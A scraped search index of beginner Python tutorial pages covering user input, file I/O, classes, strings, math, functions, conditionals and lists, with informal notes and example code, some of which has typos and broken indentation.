<p>The\u00a0<code>input()</code>\u00a0function always returns the user's input as a string. If you need to convert the input to a different data type, such as an integer or float, you can use appropriate conversion functions like\u00a0<code>int()</code>\u00a0or\u00a0<code>float()</code>.</p> <p>age = input(\"Enter your age: \") age = int(age)\u00a0 # Convert the input to an integer</p> <p>print(\"You will be \" + str(age + 1) + \" next year.\")</p> <p>In this example, the user is asked to enter their age. The input is stored as a string in the variable\u00a0<code>age</code>. To perform arithmetic calculations, the input is converted to an integer using the\u00a0<code>int()</code>\u00a0function. The program then adds 1 to the age and prints the result.</p> <p>When using user input, keep in mind that it is a string by default. Ensure proper validation and error handling if you expect specific data types or want to handle invalid input.</p> <p>User input allows you to make your programs interactive and dynamic by accepting input from users during runtime. It provides a way to customize program behavior based on user responses.  </p> <p>PYTHON</p> <pre><code>#USER INPUT\nx = float(input(\"Give me a number: \")) \no = input(\"Give me an operator: \") \ny = float(input(\"Give me yet another number: \")) \n\nif o == \"+\": \n    print(x + y) \nelif o == \"-\": \n    print(x - y) \nelif o == \"/\": \n    print(x / y) \nelif o == \"*\":\n    print(x * y) \nelif o == \"**\": \n    print(x ** y) \nelse: \n    print(\"Unknown operator.\")\n</code></pre>"},{"location":"5.Introduction%20to%20Python/17.%20%20Reading%20and%20Writing%20Files/","title":"17.  Reading and Writing Files","text":"<p>In Python, you can read from and write to files using file objects and various methods provided by the built-in\u00a0<code>open()</code>\u00a0function. Here's an explanation of reading from and writing to files in Python:</p> <p>Reading Files:</p> <p>To read from a file, you need to open it in read mode using the\u00a0<code>open()</code>\u00a0function. Once the file is open, you can use methods like\u00a0<code>read()</code>,\u00a0<code>readline()</code>, or\u00a0<code>readlines()</code>\u00a0to retrieve the contents of the file.</p> <ul> <li><code>read()</code>: Reads the entire content of the file as a string.</li> <li><code>readline()</code>: Reads a single line from the file.</li> <li><code>readlines()</code>: Reads all lines from the file and returns them as a list.</li> </ul> <p>Here's an example of reading from a file:</p>"},{"location":"5.Introduction%20to%20Python/17.%20%20Reading%20and%20Writing%20Files/#open-the-file-in-read-mode","title":"Open the file in read mode","text":"<p>file = open(\"example.txt\", \"r\")</p>"},{"location":"5.Introduction%20to%20Python/17.%20%20Reading%20and%20Writing%20Files/#read-the-entire-content","title":"Read the entire content","text":"<p>content = file.read() print(content)</p>"},{"location":"5.Introduction%20to%20Python/17.%20%20Reading%20and%20Writing%20Files/#read-a-single-line","title":"Read a single line","text":"<p>line = file.readline() print(line)</p>"},{"location":"5.Introduction%20to%20Python/17.%20%20Reading%20and%20Writing%20Files/#read-all-lines","title":"Read all lines","text":"<p>lines = file.readlines() print(lines)</p>"},{"location":"5.Introduction%20to%20Python/17.%20%20Reading%20and%20Writing%20Files/#close-the-file","title":"Close the file","text":"<p>file.close()</p> <p>Writing Files:</p> <p>To write to a file, you need to open it in write mode using the\u00a0<code>open()</code>\u00a0function. Once the file is open, you can use the\u00a0<code>write()</code>\u00a0method to write content to the file.</p> <ul> <li><code>write(content)</code>: Writes the specified content to the file.</li> </ul> <p>Here's an example of writing to a file:</p>"},{"location":"5.Introduction%20to%20Python/17.%20%20Reading%20and%20Writing%20Files/#open-the-file-in-write-mode","title":"Open the file in write mode","text":"<p>file = open(\"example.txt\", \"w\")</p>"},{"location":"5.Introduction%20to%20Python/17.%20%20Reading%20and%20Writing%20Files/#write-content-to-the-file","title":"Write content to the file","text":"<p>file.write(\"Hello, World!\\n\") file.write(\"This is a new line.\")</p>"},{"location":"5.Introduction%20to%20Python/17.%20%20Reading%20and%20Writing%20Files/#close-the-file_1","title":"Close the file","text":"<p>file.close()</p> <p>Appending to Files:</p> <p>To append content to an existing file without overwriting its existing contents, you can open the file in append mode (<code>\"a\"</code>) using the\u00a0<code>open()</code>\u00a0function. Then, you can use the\u00a0<code>write()</code>\u00a0method to append content to the file.</p>"},{"location":"5.Introduction%20to%20Python/17.%20%20Reading%20and%20Writing%20Files/#open-the-file-in-append-mode","title":"Open the file in append mode","text":"<p>file = open(\"example.txt\", \"a\")</p>"},{"location":"5.Introduction%20to%20Python/17.%20%20Reading%20and%20Writing%20Files/#append-content-to-the-file","title":"Append content to the file","text":"<p>file.write(\"\\nThis is appended content.\")</p>"},{"location":"5.Introduction%20to%20Python/17.%20%20Reading%20and%20Writing%20Files/#close-the-file_2","title":"Close the file","text":"<p>file.close()</p> <p>It is generally recommended to use the\u00a0<code>with</code>\u00a0statement when working with files. This ensures that the file is properly closed even if an exception occurs.</p> <p>with open(\"example.txt\", \"r\") as file: \u00a0 \u00a0 content = file.read() \u00a0 \u00a0 print(content)</p> <p>Reading and writing files in Python allows you to handle external data, process large amounts of information, and store program outputs for later use. It is important to properly manage file resources and close them after use to avoid memory leaks and ensure data integrity.</p> <pre><code>months = open('months.txt') \nprint(months) \nprint(months.mode) \nprint(months.readable())\nmonths.close() \nprint(months.read()) \nprint(months.readline()) #reads one line \nprint(months.readline()) #reads next line \nprint(months.readlines()) #prints an array \nprint(months.readlines()) #prints an empty array because we already read it \nmonths.seek(0) \nprint(months.readlines()) - prints an array again \n\nmonths.seek(0) \n    for month in months: \n        print(month) \nmonths.seek(0) \n    for month in months: \n        print(month.strip()) \n\ndays = open(\"days.txt\", \"w\") \ndays.write(\"Monday\") \ndays.close() \ndays = open(\"days.txt\", \"w\") \ndays.write(\"\\nTuesday\") - overwrites \ndays.close() \ndays = open(\"days.txt\", \"a\") \ndays.write(\"\\nWednesday\") - appends \n\ndays.close()\n</code></pre>"},{"location":"5.Introduction%20to%20Python/18.%20%20Classes%20and%20Objects/","title":"18.  Classes and Objects","text":"<p>In Python, classes and objects are key components of object-oriented programming (OOP). They provide a way to structure code and define custom data types. Here's an explanation of classes and objects in Python:</p> <p>Classes:</p> <p>A class is a blueprint or a template for creating objects. It defines the properties (attributes) and behaviors (methods) that objects of that class will possess. You can think of a class as a blueprint for creating instances of objects with similar characteristics and functionalities. Here's an example of a simple class definition:</p> <p>class Dog: \u00a0 \u00a0 def init(self, name, age): \u00a0 \u00a0 \u00a0 \u00a0 self.name = name \u00a0 \u00a0 \u00a0 \u00a0 self.age = age</p> <p>def bark(self): \u00a0 \u00a0 \u00a0 \u00a0 print(\"Woof!\")</p> <p>def display_info(self): \u00a0 \u00a0 \u00a0 \u00a0 print(\"Name:\", self.name) \u00a0 \u00a0 \u00a0 \u00a0 print(\"Age:\", self.age)</p> <p>In this example, the\u00a0<code>Dog</code>\u00a0class has attributes\u00a0<code>name</code>\u00a0and\u00a0<code>age</code>, and methods\u00a0<code>bark()</code>\u00a0and\u00a0<code>display_info()</code>. The\u00a0<code>__init__()</code>\u00a0method is a special method known as the constructor, which is called when an object of the class is created.</p> <p>Objects:</p> <p>An object is an instance of a class. It is created based on the blueprint provided by the class. Each object has its own set of attributes and can invoke the methods defined in the class. You create objects by calling the class as if it were a function. Here's an example:</p>"},{"location":"5.Introduction%20to%20Python/18.%20%20Classes%20and%20Objects/#create-objects-of-the-dog-class","title":"Create objects of the Dog class","text":"<p>dog1 = Dog(\"Buddy\", 5) dog2 = Dog(\"Max\", 3)</p>"},{"location":"5.Introduction%20to%20Python/18.%20%20Classes%20and%20Objects/#call-methods-on-the-objects","title":"Call methods on the objects","text":"<p>dog1.bark()\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0# Output: \"Woof!\" dog1.display_info()\u00a0 \u00a0 \u00a0 \u00a0# Output: \"Name: Buddy\", \"Age: 5\"</p> <p>dog2.bark()\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0# Output: \"Woof!\" dog2.display_info()\u00a0 \u00a0 \u00a0 \u00a0# Output: \"Name: Max\", \"Age: 3\"</p> <p>In this example,\u00a0<code>dog1</code>\u00a0and\u00a0<code>dog2</code>\u00a0are objects created from the\u00a0<code>Dog</code>\u00a0class. Each object has its own set of attributes (<code>name</code>\u00a0and\u00a0<code>age</code>) and can invoke the methods (<code>bark()</code>\u00a0and\u00a0<code>display_info()</code>) defined in the class.</p> <p>Classes and objects are essential in object-oriented programming as they provide a way to organize code, encapsulate data, and define reusable entities. They enable you to model real-world entities, create custom data types, and build complex systems by leveraging the principles of inheritance, polymorphism, and encapsulation.  </p> <pre><code>class Employees: \n    def __init__(self, name, department, role, salary, years_employed): \n        self.name = name \n        self.department = department \n        self.role = role \n        self.salary = salary s\n        elf.years_employed = years_employed \n\n    def eligible_for_retirement(self): \n    if self.years_employed &gt;= 20: \n        return True\n     else: \n         return False\n</code></pre> <pre><code>from Employees import Employees\ne1 = Employees(\"Bob\", \"Sales\", \"Director of Sales\", 100000, 20) \ne2 = Employees(\"Linda\", \"Executive\", \"CIO\", 150000, 10)\n\nprint(e1.name)\nprint(e2.role) \nprint(e1.eligible_for_retirement())\n</code></pre>"},{"location":"5.Introduction%20to%20Python/19.%20%20Building%20a%20Shoe%20Budget%20Tool/","title":"19.  Building a Shoe Budget Tool","text":"<pre><code>class Shoes: \n    def __init__(self, name, price): \n        self.name = name \n        self.price = float(price) \n    def budget_check(self, budget): \n        if not isinstance(budget, (int, float)): \n                print('Invalid entry. Please enter a number.')       \n                exit() \n    def change(self, budget): \n        return (budget - self.price) \n    def buy(self, budget): \n        self.budget_check(budget) \n        if budget &gt;= self.price: \n            print(f'You can cop some {self.name}') \n            if budget == self.price: \n                print('You have exactly enough money for these shoes.') \n            else: \n                print(f'You can buy these shoes and have ${self.change(budget)} left over')\n            exit('Thanks for using our shoe budget app!')`\n</code></pre> <pre><code>`#!/bin/python3 \nfrom Shoes import Shoes \nlow = Shoes('And 1s', 30) \nmedium = Shoes('Air Force 1s', 120) \nhigh = Shoes('Off Whites', 400) \ntry: \n    shoe_budget = float(input('What is your shoe budget? ')) \nexcept ValueError: \n    exit('Please enter a number') \n\nfor shoes in [high, medium, low]: \n    shoes.buy(shoe_budget)\n</code></pre> <pre><code>months = open('months.txt') \nprint(months) \nprint(months.mode) \nprint(months.readable())\nmonths.close() \nprint(months.read()) \nprint(months.readline()) #reads one line \nprint(months.readline()) #reads next line \nprint(months.readlines()) #prints an array \nprint(months.readlines()) #prints an empty array because we already read it \nmonths.seek(0) \nprint(months.readlines()) - prints an array again \n\nmonths.seek(0) \n    for month in months: \n        print(month) \nmonths.seek(0) \n    for month in months: \n        print(month.strip()) \n\ndays = open(\"days.txt\", \"w\") \ndays.write(\"Monday\") \ndays.close() \ndays = open(\"days.txt\", \"w\") \ndays.write(\"\\nTuesday\") - overwrites \ndays.close() \ndays = open(\"days.txt\", \"a\") \ndays.write(\"\\nWednesday\") - appends \n\ndays.close()\n</code></pre> <p>[!note] dry appraoch : dont repeat yourself</p>"},{"location":"5.Introduction%20to%20Python/2.strings/","title":"2.strings","text":"<p>In Python, the\u00a0<code>str</code>\u00a0(string) data type represents a sequence of characters enclosed within single quotes (' ') or double quotes (\" \"). Strings in Python are immutable, which means they cannot be changed after they are created. Here are some key points about strings in Python:</p> <p>Creation:</p> <ul> <li> <ul> <li>Example:\u00a0<code>my_string = 'Hello, World!'</code>\u00a0or\u00a0<code>my_string = \"Hello, World!\"</code></li> </ul> </li> </ul> <p>Accessing Characters:</p> <ul> <li> <ul> <li>You can access individual characters within a string using indexing, starting from 0.</li> <li>Example:\u00a0<code>print(my_string[0])</code>\u00a0would output 'H'.</li> </ul> </li> </ul> <p>String Concatenation:</p> <ul> <li> <ul> <li>You can concatenate (join) two or more strings using the\u00a0<code>+</code>\u00a0operator.</li> <li>Example:\u00a0<code>greeting = 'Hello' + ' ' + 'World!'</code>\u00a0would result in 'Hello World!'.</li> </ul> </li> </ul> <p>String Length:</p> <ul> <li> <ul> <li>The\u00a0<code>len()</code>\u00a0function can be used to determine the length (number of characters) of a string.</li> <li>Example:\u00a0<code>print(len(my_string))</code>\u00a0would output the length of the string.</li> </ul> </li> </ul> <p>String Slicing:</p> <ul> <li> <ul> <li>You can extract a substring from a string using slicing, specifying the start and end indices.</li> <li>Example:\u00a0<code>substring = my_string[7:12]</code>\u00a0would extract the substring 'World'.</li> </ul> </li> </ul> <p>String Methods:</p> <ul> <li> <ul> <li>Python provides various built-in methods to manipulate and transform strings. Examples include\u00a0<code>upper()</code>,\u00a0<code>lower()</code>,\u00a0<code>strip()</code>,\u00a0<code>split()</code>,\u00a0<code>replace()</code>, and more.</li> <li>Example:\u00a0<code>print(my_string.upper())</code>\u00a0would output 'HELLO, WORLD!'.</li> </ul> </li> </ul> <p>String Formatting:</p> <ul> <li> <ul> <li>String formatting allows you to embed values within a string. This can be done using the\u00a0<code>%</code>\u00a0operator or the\u00a0<code>format()</code>\u00a0method.</li> </ul> </li> <li>Example:</li> </ul> <p>name = 'Alice' age = 30 print(\"My name is %s and I'm %d years old.\" % (name, age))</p>"},{"location":"5.Introduction%20to%20Python/2.strings/#output-my-name-is-alice-and-im-30-years-old","title":"Output: My name is Alice and I'm 30 years old.","text":"<p>These are just a few key concepts related to strings in Python. Strings in Python are versatile and support a wide range of operations and manipulations.  </p> <p>PYTHON</p> <p><code>#Print string print(\"Hello, world!\") print('Hello, world!') print(\"\"\"This string runs multiple lines!\"\"\") print(\"This string is \"+\"awesome!\") #we can also concatenate print('\\n') #new line print('Test that new line out.')</code></p>"},{"location":"5.Introduction%20to%20Python/3.%20%20Math/","title":"3.  Math","text":"<p>In Python, the\u00a0<code>math</code>\u00a0module is a built-in module that provides various mathematical functions and constants. It allows you to perform advanced mathematical operations in your Python programs. To use the\u00a0<code>math</code>\u00a0module, you need to import it first using the\u00a0<code>import</code>\u00a0statement. Here's an overview of some commonly used math functions and operators in Python:</p> <p>Math Functions in the\u00a0<code>math</code>\u00a0Module:</p> <ul> <li><code>math.sqrt(x)</code>: Calculates the square root of\u00a0<code>x</code>.</li> <li><code>math.pow(x, y)</code>: Raises\u00a0<code>x</code>\u00a0to the power of\u00a0<code>y</code>.</li> <li><code>math.exp(x)</code>: Calculates the exponential value of\u00a0<code>x</code>\u00a0(e^x).</li> <li><code>math.log(x)</code>: Calculates the natural logarithm of\u00a0<code>x</code>\u00a0(base e).</li> <li><code>math.log10(x)</code>: Calculates the logarithm of\u00a0<code>x</code>\u00a0to base 10.</li> <li><code>math.sin(x)</code>,\u00a0<code>math.cos(x)</code>,\u00a0<code>math.tan(x)</code>: Calculate the sine, cosine, and tangent of\u00a0<code>x</code>, respectively (where\u00a0<code>x</code>\u00a0is in radians).</li> <li><code>math.degrees(x)</code>: Converts\u00a0<code>x</code>\u00a0from radians to degrees.</li> <li><code>math.radians(x)</code>: Converts\u00a0<code>x</code>\u00a0from degrees to radians.</li> </ul> <p>Math Operators:</p> <ul> <li>Addition (<code>+</code>): Adds two numbers.</li> <li>Subtraction (<code>-</code>): Subtracts one number from another.</li> <li>Multiplication (<code>*</code>): Multiplies two numbers.</li> <li>Division (<code>/</code>): Divides one number by another.</li> <li>Integer Division (<code>//</code>): Performs division and returns the quotient as an integer (rounds down).</li> <li>Modulo (<code>%</code>): Returns the remainder of division.</li> <li>Exponentiation (<code>**</code>): Raises a number to a power.</li> </ul> <p>Example usage:</p> <p>import math</p>"},{"location":"5.Introduction%20to%20Python/3.%20%20Math/#using-math-functions","title":"Using math functions","text":"<p>print(math.sqrt(25)) # Output: 5.0  print(math.pow(2, 3)) # Output: 8.0  print(math.sin(math.pi/2)) # Output: 1.0 </p>"},{"location":"5.Introduction%20to%20Python/3.%20%20Math/#using-math-operators","title":"Using math operators","text":"<p>x = 10 y = 3 print(x + y) # Output: 13  print(x / y) # Output: 3.3333333333333335  print(x // y) # Output: 3  print(x % y) # Output: 1  print(x ** y) # Output: 1000 </p> <p>These are just a few examples of the mathematical functions and operators available in Python. The\u00a0<code>math</code>\u00a0module provides many more functions and constants that you can explore in the Python documentation.  </p> <p>PYTHON</p> <p>```python</p>"},{"location":"5.Introduction%20to%20Python/3.%20%20Math/#math","title":"Math","text":"<p>print(50 + 50) #add print(50 - 50) #subtract  print(50 * 50) #multiply  print(50 / 50) #divide  print(50 + 50 - 50 * 50 / 50) #PEMDAS  print(50 ** 2) #exponents  print(50 % 6) #modulo - takes what is left over  print(50 / 6) #division with decimals  print(50 // 6) #no remainder```</p>"},{"location":"5.Introduction%20to%20Python/4.%20%20Variables%20and%20Methods/","title":"4.  Variables and Methods","text":"<p>In Python, variables and methods are fundamental concepts used in programming. Here's an explanation of each:</p> <p>Variables:</p> <p>A variable is a named storage location used to store data or values in a program. It acts as a placeholder for data that can be accessed, modified, or used in calculations throughout the program. Variables in Python are dynamically typed, meaning their data type can change during program execution. Here's an example of variable usage in Python:</p>"},{"location":"5.Introduction%20to%20Python/4.%20%20Variables%20and%20Methods/#variable-assignment","title":"Variable assignment","text":"<p>x = 10 name = \"John\" is_true = True</p>"},{"location":"5.Introduction%20to%20Python/4.%20%20Variables%20and%20Methods/#variable-usage","title":"Variable usage","text":"<p>y = x + 5 print(\"Hello, \" + name) if is_true: \u00a0 \u00a0 print(\"The condition is true\")</p> <p>In the example above,\u00a0<code>x</code>,\u00a0<code>name</code>, and\u00a0<code>is_true</code>\u00a0are variables assigned with different data types (integer, string, and boolean, respectively). They are used in calculations and print statements to perform operations and display values.</p> <p>Methods:</p> <p>A method is a block of reusable code that performs a specific task or action. Methods are associated with objects or classes and are called upon to perform certain operations. In Python, methods are commonly referred to as functions. Built-in functions and user-defined functions both fall under the category of methods. Here's an example:</p>"},{"location":"5.Introduction%20to%20Python/4.%20%20Variables%20and%20Methods/#built-in-method-example","title":"Built-in method example","text":"<p>numbers = [1, 2, 3, 4, 5] length = len(numbers) print(\"Length:\", length)</p>"},{"location":"5.Introduction%20to%20Python/4.%20%20Variables%20and%20Methods/#user-defined-method-example","title":"User-defined method example","text":"<p>def greet(name): \u00a0 \u00a0 print(\"Hello, \" + name)</p> <p>greet(\"Alice\")</p> <p>In the example above,\u00a0<code>len()</code>\u00a0is a built-in method that calculates the length of a list (<code>numbers</code>\u00a0in this case). The user-defined method\u00a0<code>greet()</code>\u00a0takes a parameter\u00a0<code>name</code>\u00a0and prints a greeting message. It is called with the argument \"Alice\" to print \"Hello, Alice\" to the console.</p> <p>Methods can have return values, perform actions, accept parameters, and more, depending on their purpose and design.</p> <p>Variables and methods are essential components in Python programming. Variables store data, while methods encapsulate reusable blocks of code for specific tasks. Understanding their usage and relationship is crucial for building functional and efficient programs.  </p> <p>PYTHON</p> <pre><code>#Variables and Methods \nquote = \"All is fair in love and war.\" \nprint(quote) \nprint(quote.upper()) #uppercase print(quote.lower()) #lowercase\nprint(quote.title()) #title case \nprint(len(quote)) #counts characters \nname = \"Heath\" #string \nage = 33 #int \ngpa = 3.7 #float - has a decimal \nprint(int(age)) \nprint(int(30.1)) \nprint(int(30.9)) # Will it round? No! \nprint(\"My name is \" + name + \" and I am \" + str(age) + \" years old.\") \nage +=1 \nprint(age) \nbirthday = 1 \nage += birthday \nprint(age)\n</code></pre>"},{"location":"5.Introduction%20to%20Python/5.functions/","title":"5.functions","text":"<p>In Python, a function is a reusable block of code that performs a specific task. Functions allow you to organize code into logical and modular units, making your code more readable, maintainable, and reusable. Here's an explanation of functions in Python:</p> <p>Function Definition:</p> <p>A function is defined using the\u00a0<code>def</code>\u00a0keyword, followed by the function name, parentheses, and a colon. The function may also have parameters (optional) and a return statement (optional) to send back a result. Here's an example of a simple function definition:</p> <p>def greet(): \u00a0 \u00a0 print(\"Hello, World!\")</p> <p>Function Call:</p> <p>To execute a function, you need to call it by its name, followed by parentheses. Here's an example of calling the\u00a0<code>greet()</code>\u00a0function:</p> <p>greet()</p> <p>Function Parameters:</p> <p>Functions can accept parameters, which are variables that hold values passed to the function when it is called. Parameters allow you to customize the behavior of a function based on the values you provide. Here's an example of a function with parameters:</p> <p>def greet(name): \u00a0 \u00a0 print(\"Hello, \" + name + \"!\")</p> <p>greet(\"Alice\")</p> <p>In the example above, the\u00a0<code>greet()</code>\u00a0function accepts a parameter named\u00a0<code>name</code>. When the function is called with an argument, such as \"Alice\", the value is assigned to the\u00a0<code>name</code>\u00a0parameter within the function body.</p> <p>Return Statement:</p> <p>Functions can also return values using the\u00a0<code>return</code>\u00a0statement. The returned value can be assigned to a variable or used directly in expressions. Here's an example:</p> <p>def add_numbers(a, b): \u00a0 \u00a0 return a + b</p> <p>result = add_numbers(3, 4) print(result)\u00a0 # Output: 7</p> <p>In this example, the\u00a0<code>add_numbers()</code>\u00a0function takes two parameters (<code>a</code>\u00a0and\u00a0<code>b</code>) and returns their sum. The returned value is then assigned to the\u00a0<code>result</code>\u00a0variable and printed.</p> <p>Functions provide a way to encapsulate reusable code and improve the structure of your programs. They can take inputs, perform computations, and produce outputs, allowing you to modularize your code and make it more efficient and maintainable.  </p> <p>PYTHON</p> <p>```python</p>"},{"location":"5.Introduction%20to%20Python/5.functions/#functions","title":"Functions","text":"<p>print(\"Here is an example function:\")  def who_am_i(): #this is a function without parameters  name = \"Heath\" age = 30 #local variable  print(\"My name is \" + name + \" and I am \" + str(age) + \" years old.\") who_am_i() </p>"},{"location":"5.Introduction%20to%20Python/5.functions/#adding-parameters","title":"adding parameters","text":"<p>def add_one_hundred(num): print(num + 100) add_one_hundred(100) </p>"},{"location":"5.Introduction%20to%20Python/5.functions/#multiple-parameters","title":"multiple parameters","text":"<p>def add(x,y): print(x + y)  add(7,7) </p> <p>def multiply(x,y): return x * y multiply(7,7) # print(multiply(7,7)) # return to store \\print to display</p> <p>def square_root(x): print(x ** .5)  square_root(64) </p> <p>def nl(): print('\\n')  nl()`</p>"},{"location":"5.Introduction%20to%20Python/6.%20%20Boolean%20Expressions%20and%20Relational%20Operators/","title":"6.  Boolean Expressions and Relational Operators","text":"<p>In Python, boolean expressions are expressions that evaluate to either\u00a0<code>True</code>\u00a0or\u00a0<code>False</code>. They are typically used in conditional statements and logical operations to make decisions based on the truth or falsity of certain conditions. Relational operators are used to compare values and create boolean expressions. Here's an explanation of boolean expressions and relational operators in Python:</p> <p>Relational Operators:</p> <p>Python provides several relational operators to compare values. Here are the commonly used relational operators:</p> <ul> <li>Equality (<code>==</code>): Checks if two values are equal.</li> <li>Inequality (<code>!=</code>): Checks if two values are not equal.</li> <li>Greater than (<code>&gt;</code>): Checks if the left value is greater than the right value.</li> <li>Less than (<code>&lt;</code>): Checks if the left value is less than the right value.</li> <li>Greater than or equal to (<code>&gt;=</code>): Checks if the left value is greater than or equal to the right value.</li> <li>Less than or equal to (<code>&lt;=</code>): Checks if the left value is less than or equal to the right value.</li> </ul> <p>Boolean Expressions:</p> <p>Boolean expressions are formed by combining relational expressions using logical operators. The logical operators in Python are:</p> <ul> <li>Logical AND (<code>and</code>): Returns\u00a0<code>True</code>\u00a0if both operands are\u00a0<code>True</code>.</li> <li>Logical OR (<code>or</code>): Returns\u00a0<code>True</code>\u00a0if at least one operand is\u00a0<code>True</code>.</li> <li>Logical NOT (<code>not</code>): Negates the value of the operand.</li> </ul> <p>Examples:</p> <p>x = 5 y = 10</p>"},{"location":"5.Introduction%20to%20Python/6.%20%20Boolean%20Expressions%20and%20Relational%20Operators/#relational-operators","title":"Relational operators","text":"<p>print(x == y)\u00a0 \u00a0# Output: False print(x &lt; y)\u00a0 \u00a0 # Output: True</p>"},{"location":"5.Introduction%20to%20Python/6.%20%20Boolean%20Expressions%20and%20Relational%20Operators/#boolean-expressions","title":"Boolean expressions","text":"<p>print(x &lt; y and y &gt; 0)\u00a0 \u00a0 # Output: True print(x &lt; y or y &lt; 0)\u00a0 \u00a0 \u00a0# Output: True print(not (x == y))\u00a0 \u00a0 \u00a0 \u00a0# Output: True</p> <p>In the example above, we have two variables\u00a0<code>x</code>\u00a0and\u00a0<code>y</code>. We use the relational operators (<code>==</code>\u00a0and\u00a0<code>&lt;</code>) to compare their values and create boolean expressions. The logical operators (<code>and</code>,\u00a0<code>or</code>, and\u00a0<code>not</code>) are then used to combine the relational expressions and evaluate the overall truth value.</p> <p>Boolean expressions and relational operators are fundamental in controlling the flow of your program by making decisions based on conditions. They are extensively used in if statements, while loops, and other control structures to determine the execution path of your code.  </p> <p>PYTHON</p> <pre><code>#Boolean expressions (True or False) \nprint(\"Boolean expressions:\") \nbool1 = True \nbool2 = 3*3 == 9 \nbool3 = False \nbool4 = 3*3 != 9 \nprint(bool1,bool2,bool3,bool4) \nprint(type(bool1)) \nbool5 = \"True\" \nprint(type(bool5)) nl()\n#Relational and Boolean operators \ngreater_than = 7 &gt; 5 \nless_than = 5 &lt; 7 \ngreater_than_equal_to = 7 &gt;=7 \nless_than_equal_to = 7 &lt;= 7 \ntest_and = True and True \n#True \ntest_and2 = True and False \n#False \ntest_or = True or True \n#True \ntest_or2 = True or False #True \ntest_not = not True #False\n</code></pre>"},{"location":"5.Introduction%20to%20Python/7.%20%20Conditional%20Statements/","title":"7.  Conditional Statements","text":"<p>In Python, conditional statements are used to perform different actions based on certain conditions. They allow you to control the flow of your program by executing specific blocks of code when certain conditions are met. Here's an explanation of conditional statements in Python:</p> <ol> <li>if Statement:</li> <li>The\u00a0<code>if</code>\u00a0statement is the most basic conditional statement. It executes a block of code if a given condition is true. Here's the general syntax:</li> </ol> <p>if condition: \u00a0 \u00a0 # code to be executed if the condition is true</p> <p>Example:</p> <p>x = 5 if x &gt; 0: \u00a0 \u00a0 print(\"x is positive\")</p> <p>In this example, the code inside the\u00a0<code>if</code>\u00a0block (<code>print(\"x is positive\")</code>) will be executed if the condition\u00a0<code>x &gt; 0</code>\u00a0is true.</p> <ol> <li>if-else Statement:</li> <li>The\u00a0<code>if-else</code>\u00a0statement allows you to specify two different blocks of code\u2014one to be executed if the condition is true and another to be executed if the condition is false. Here's the syntax:</li> </ol> <p>if condition: \u00a0 \u00a0 # code to be executed if the condition is true else: \u00a0 \u00a0 # code to be executed if the condition is false</p> <p>Example:</p> <p>x = 5 if x &gt; 0: \u00a0 \u00a0 print(\"x is positive\") else: \u00a0 \u00a0 print(\"x is not positive\")</p> <p>In this example, if\u00a0<code>x</code>\u00a0is greater than 0, the first block (<code>print(\"x is positive\")</code>) will be executed. Otherwise, the second block (<code>print(\"x is not positive\")</code>) will be executed.</p> <ol> <li>if-elif-else Statement:</li> <li>The\u00a0<code>if-elif-else</code>\u00a0statement allows you to check multiple conditions and execute different blocks of code based on those conditions. It provides more than two options for branching. Here's the syntax:</li> </ol> <p>if condition1: \u00a0 \u00a0 # code to be executed if condition1 is true elif condition2: \u00a0 \u00a0 # code to be executed if condition1 is false and condition2 is true else: \u00a0 \u00a0 # code to be executed if all conditions are false</p> <p>Example:</p> <p>x = 5 if x &gt; 0: \u00a0 \u00a0 print(\"x is positive\") elif x &lt; 0: \u00a0 \u00a0 print(\"x is negative\") else: \u00a0 \u00a0 print(\"x is zero\")</p> <p>In this example, if\u00a0<code>x</code>\u00a0is greater than 0, the first block will be executed. If it is less than 0, the second block will be executed. Otherwise, if none of the conditions are true, the third block will be executed.</p> <p>Conditional statements allow you to make decisions and control the execution flow of your program based on certain conditions. They are essential for implementing logic and branching in your code.  </p> <p>PYTHON</p> <pre><code>#Conditional Statements \ndef drink(money): \n    if money &gt;= 2: \n        return \"You've got yourself a drink!\" \n    else: \n        return \"No drink for you!\" \n\nprint(drink(3)) \nprint(drink(1)) \ndef alcohol(age,money): \n    if(age &gt;= 21) and (money &gt;= 5): \n        return \"We're getting a drink!\"\n     elif (age &gt;= 21) and (money &lt; 5): \n         return \"Come back with more money.\" \n     elif (age &lt; 21) and (money &gt;= 5): \n         return \"Nice try, kid!\" \n    else: \n        return \"You're too poor and too young!\" print(alcohol(21,5)) print(alcohol(21,4)) print(alcohol(20,5)) print(alcohol(20,4))\n</code></pre>"},{"location":"5.Introduction%20to%20Python/8.%20%20Lists/","title":"8.  Lists","text":"<p>In Python, a list is a versatile and mutable data structure that can hold a collection of items. It allows you to store multiple values of different data types in a single variable. Here's an explanation of lists in Python:</p> <p>List Creation:</p> <p>To create a list, you enclose comma-separated values within square brackets\u00a0<code>[ ]</code>. Here's an example:</p> <p>fruits = [\"apple\", \"banana\", \"orange\"] </p> <p>List Access:</p> <p>You can access individual elements in a list using indexing. Indexing starts from 0 for the first element and goes up to the length of the list minus one. Here are some examples:</p> <p>print(fruits[0])\u00a0 \u00a0 # Output: \"apple\" print(fruits[2])\u00a0 \u00a0 # Output: \"orange\"</p> <p>List Modification:</p> <p>Lists are mutable, which means you can modify their elements. You can assign new values to specific positions in the list or use methods to modify the list itself. Here are some examples:</p> <p>fruits[1] = \"grape\"\u00a0 \u00a0 \u00a0# Modifying an element fruits.append(\"kiwi\")\u00a0 \u00a0# Adding an element to the end fruits.remove(\"apple\")\u00a0 # Removing an element</p> <p>List Operations:</p> <p>Python provides various operations that can be performed on lists. Some common operations include:</p> <ul> <li>Concatenation: You can use the\u00a0<code>+</code>\u00a0operator to concatenate two or more lists.</li> <li>Length: The\u00a0<code>len()</code>\u00a0function returns the number of elements in a list.</li> <li>Slicing: You can extract a sublist from a list using slicing.</li> <li>Iteration: You can use a loop to iterate over the elements of a list.</li> </ul> <p>Here are some examples:</p> <p>fruits = [\"apple\", \"banana\", \"orange\"] fruits2 = [\"grape\", \"kiwi\"]</p> <p>combined = fruits + fruits2 print(combined)\u00a0 \u00a0 \u00a0 \u00a0 \u00a0# Output: [\"apple\", \"banana\", \"orange\", \"grape\", \"kiwi\"]</p> <p>print(len(fruits))\u00a0 \u00a0 \u00a0 # Output: 3</p> <p>sublist = fruits[1:3] print(sublist)\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 # Output: [\"banana\", \"orange\"]</p> <p>for fruit in fruits: \u00a0 \u00a0 print(fruit)\u00a0 \u00a0 \u00a0 \u00a0 # Output: \"apple\", \"banana\", \"orange\"</p> <p>Lists are powerful data structures in Python that allow you to store and manipulate collections of items. They are widely used for managing and processing data in various applications.  </p> 